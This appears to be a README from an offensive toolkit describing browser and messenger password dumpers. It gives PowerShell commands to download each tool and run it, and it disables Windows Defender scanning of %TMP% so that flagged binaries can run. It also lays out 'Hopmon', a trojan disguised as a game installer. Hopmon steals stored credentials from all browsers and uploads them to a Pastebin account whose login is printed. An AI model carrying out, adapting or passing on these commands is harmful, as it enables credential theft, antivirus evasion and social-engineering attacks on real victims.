## DumpChromePasswords.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|DumpChromePasswords|dumps URLs, usernames, and passwords from Chrome.|User Land|Only dumps chrome browser|

<br />

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/DumpChromePasswords.ps1" -OutFile "DumpChromePasswords.ps1"
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip" -OutFile "sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip"
```
<br />

**prerequisites:**
``` 
   1. You must have the System.Data.SQLite.dll handy (see below)
   2. Your database must be accessible (close Chrome, or make some copy)
   3. It must by your database. If Chrome cannot open it, the script will probably fail as well.
```

<br />

**execute:**
```powershell
.\DumpChromePasswords.ps1
```

<br />


## HarvestBrowserPasswords.exe

|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|HarvestBrowserPasswords|dumps URLs, usernames, and passwords from major browsers.|User Land|Dumps major browsers|

<br />

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/HarvestBrowserPasswords.exe" -OutFile "HarvestBrowserPasswords.exe"
```

<br />

**execute:**
```powershell
.\HarvestBrowserPasswords.exe -a, --all
.\HarvestBrowserPasswords.exe -f, --firefox
.\HarvestBrowserPasswords.exe -c, --chrome
```

<br />

## ChromePass.exe
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|ChromePass|dumps usernames, passwords from chrome|Administrator|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV\Download PE\Exec PE|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
```

<br />

**prerequesites checks:**
```powershell
#Make sure Windows Defender service its running
[bool](Get-Service -Name "WinDefend")

#Make sure we have administrator privileges in shell
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

#Make sure required modules are present\loaded
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Get-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference")
```

<br />

**execute:**
```powershell
#Get Exclusions List
.\Invoke-Exclusions.ps1 -action "query"

## Add exclusion Path + Download URI PE + Execute PE
# 1º - Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -OutFile "$Env:TMP\ChromePass.exe"
# 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"

#Remove ExclusionPath "$Env:TMP" from Windows Defender list
.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionPath" -Exclude "$Env:TMP"
```

<br />

**Final Notes**
```
ChromePass.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute ChromePass.exe from that location.

Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (ChromePass.exe).
Warning: Invoke-Exclusions will 'NOT' delete itself or ChromePass.exe (deliver by -Uri parameter) at the end of execution.
```

<br />

## WebBrowserPassView.exe
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|WebBrowserPassView|dumps usernames, passwords from major browsers|UserLand|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV detection<br />[WebBrowserPassView - nirsoft](https://www.nirsoft.net/utils/web_browser_password.html)|

<br />

**prerequesites checks:**
```powershell
#Make sure Windows Defender service its running
[bool](Get-Service -Name "WinDefend")

#Make sure we have administrator privileges in shell
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

#Make sure required modules are present\loaded
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Get-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference")
```

<br />

**execute:**
```powershell
#Download Invoke-Exclusions cmdlet
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"

#Get Exclusions List (optional)
.\Invoke-Exclusions.ps1 -action "query"

## Add exclusion Path + Download URI PE + Execute PE
# 1º - Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/WebBrowserPassView.exe" -OutFile "$Env:TMP\WebBrowserPassView.exe"
# 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/WebBrowserPassView.exe" -Arguments "/stext credentials.log"

#Read logfile
Get-Content -Path "$Env:TMP\credentials.log"

#Remove ExclusionPath "$Env:TMP" from Windows Defender list
.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionPath" -Exclude "$Env:TMP"
```

<br />

**Final Notes**
```
WebBrowserPassView.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute WebBrowserPassView.exe from that location.

Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (WebBrowserPassView.exe).
Warning: Invoke-Exclusions will 'NOT' delete itself or WebBrowserPassView.exe (deliver by -Uri parameter) at the end of execution.
```

<br />

## mspass.exe
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|mspass|dumps usernames, passwords of messenger applications|UserLand|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV detection<br />[mspass - nirsoft](https://www.nirsoft.net/utils/mspass.html)|

<br />

**prerequesites checks:**
```powershell
#Make sure Windows Defender service its running
[bool](Get-Service -Name "WinDefend")

#Make sure we have administrator privileges in shell
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

#Make sure required modules are present\loaded
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Get-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference")
```

<br />

**execute:**
```powershell

#Download Invoke-Exclusions cmdlet
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"

#Get Exclusions List (optional)
.\Invoke-Exclusions.ps1 -action "query"

## Add exclusion Path to Download URI PE + Execute PE
# 1º - Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/mspass.exe" -OutFile "$Env:TMP\mspass.exe"
# 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/mspass.exe" -Arguments "/stext credentials.log"

#Read logfile
Get-Content -Path "$Env:TMP\credentials.log"

#Remove ExclusionPath "$Env:TMP" from Windows Defender list
.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionPath" -Exclude "$Env:TMP"
```

<br />

**Final Notes**
```
mspass.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute mspass.exe from that location.

Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (mspass.exe).
Warning: Invoke-Exclusions will 'NOT' delete itself or mspass.exe (deliver by -Uri parameter) at the end of execution.
```

<br />


## Hopmon.exe
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|Hopmon|dumps credentials from major browsers|Administrator|lll|

<br />

**Description:**<br />
This project uses [winget](https://learn.microsoft.com/en-us/windows/package-manager/winget/) to install Hopmon game from microsoft store,<br />
then dumps all browsers credentials stored from memory and send them to<br />
the website: https://pastebin.com/u/pedro_testing where we can review them.<br />

This project contains Hopmon.exe Hopmon.ps1 and Hopmon.vbs but we<br />
only need to send Hopmon.exe to target user and convince him to execute it.<br />

<br />

- Hopmon.exe execution flow
  * It asks for administrator privileges to run (UAC)
  * It modifies powershell execution policy to UnRestricted
  * It downloads Hopmon.ps1 script into %TEMP% directory
  * Executes Hopmon.ps1 in background (hidden) process (orphan)

- Hopmon.ps1 execution flow
  * Installs Hopmon game from microsoft store.
  * Creates %TMP% directory exclusion in windows Defender
  * Dumps credentials from all installed browsers (%TEMP%)
  * Sends credentials dump to our account in PasteBin.com
  * It deletes itself (Hopmon.ps1) in the end of execution

<br />

**prerequesites checks:**
```powershell
#Make sure Windows Defender service its running
[bool](Get-Service -Name "WinDefend")

#Make sure we have administrator privileges in shell
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

#Make sure required modules are present\loaded
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference")
```

<br />

**Download Project:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/Hopmon.rar" -OutFile "Hopmon.rar"
```

<br />

**Final Notes**
```
**ACCESS-PASTEBIN-TO-REVIEW-CREDENTIALS-DUMP:**<br />
  * The attacker needs to access URL : https://pastebin.com/u/pedro_testing
  * The attacker needs to login with username : pedro_testing
  * The attacker needs to login with password : angelapastebin
   - [The attacker can now review the contents of logfiles] -

.WHAT-CAN-GO-WRONG?
   * The target did not execute Hopmon.exe with admin
     privileges when the EXE program asks for UAC access (admin)
   * The target as a diferent anti-virus instaled besides windows defender (default)
     and the probability of this scripts bypass other anti-virus detection its smaller.
   * The target uses a web browser not supported by this project so it can not dump is credentials
     Browsers supported are: Chromium, Chrome, Firefox, IE, MEdge, Safari, Opera 

.FINAL-NOTES
   * How to install a diferent game\program ?
     a) Edit Hopmon.vbs script
     b) Search inside the file for '-file Hopmon.ps1'
     c) Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -Program Sunshine'
     d) Send Hopmon.vbs (or compile to EXE) to target for manual execution.

   * How to list WinGet (microsoft store) games available ?
     Winget search games

   * How to use a diferent pastebin account ?
     a) Edit Hopmon.vbs script
     b) Search inside the file for '-file Hopmon.ps1'
     c) Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -PasteBinUserName r00t-3xp10it -PasteBinPassword angela -PastebinDeveloperKey 1ab4a1a4e39c94db4'
     d) Send Hopmon.vbs (or compile to EXE) to target for manual execution.

```
